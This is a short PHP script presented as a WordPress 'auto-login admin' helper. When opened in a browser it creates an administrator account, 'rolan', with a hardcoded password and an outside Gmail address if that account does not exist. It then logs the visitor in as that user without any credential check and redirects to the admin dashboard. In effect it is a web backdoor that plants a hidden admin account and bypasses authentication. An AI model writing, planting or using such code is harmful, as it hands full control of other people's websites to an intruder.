<?php
/**
 * Quick WordPress Auto-Login Admin Script
 * Upload this file to your WordPress root directory (where wp-load.php is located) 
 * and access it via your browser (e.g., yourdomain.com/filename.php).
 * DELETE THIS FILE IMMEDIATELY AFTER USE FOR SECURITY PURPOSES.
 */

require('wp-load.php');

$username = 'rolan';
$password = 'kmzwa8awaa1@A';
$email    = 'hersonwaku711@gmail.com';


$user = get_user_by('login', $username);

if ( !$user ) {
    // Jika belum ada, buat user baru dengan role administrator
    $user_id = wp_create_user( $username, $password, $email );
    
    if ( is_wp_error( $user_id ) ) {
        echo "Error: " . $user_id->get_error_message();
        exit;
    }
    
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
}


wp_set_current_user( $user->ID, $username );
wp_set_auth_cookie( $user->ID, true );
do_action( 'wp_login', $username, $user );


wp_redirect( admin_url() );
exit;
?>
